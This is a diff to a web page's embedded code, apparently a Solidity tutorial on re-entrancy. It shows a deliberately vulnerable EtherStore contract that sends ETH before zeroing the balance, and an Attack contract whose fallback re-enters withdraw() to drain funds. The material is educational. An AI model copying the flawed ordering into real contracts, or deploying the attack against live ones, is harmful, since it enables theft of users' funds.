@@ -10,8 +10,8 @@ const html = `<h3 id="vulnerability">Vulnerability</h3>
 <span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.3;</span>
 
 <span class="hljs-comment">/*
-EtherStore is a contract where you can deposit any amount and withdraw at most
-1 Ether per week. This contract is vulnerable to re-entrancy attack.
+EtherStore is a contract where you can deposit and withdraw ETH.
+This contract is vulnerable to re-entrancy attack.
 Let&#x27;s see why.
 
 1. Deploy EtherStore
@@ -46,16 +46,14 @@ Here is how the functions were called
         balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
     }
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
-        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= _amount);
-        <span class="hljs-built_in">require</span>(_amount &lt;= WITHDRAWAL_LIMIT);
-        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> &gt;= lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] + <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>);
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">uint</span> bal = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
+        <span class="hljs-built_in">require</span>(bal &gt; <span class="hljs-number">0</span>);
 
-        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
+        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: bal}(<span class="hljs-string">""</span>);
         <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
 
-        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _amount;
-        lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>;
+        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;
     }
 
     <span class="hljs-comment">// Helper function to check the balance of this contract</span>
@@ -74,14 +72,14 @@ Here is how the functions were called
     <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
     <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
-            etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
+            etherStore.withdraw();
         }
     }
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
         <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
         etherStore.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
-        etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
+        etherStore.withdraw();
     }
 
     <span class="hljs-comment">// Helper function to check the balance of this contract</span>
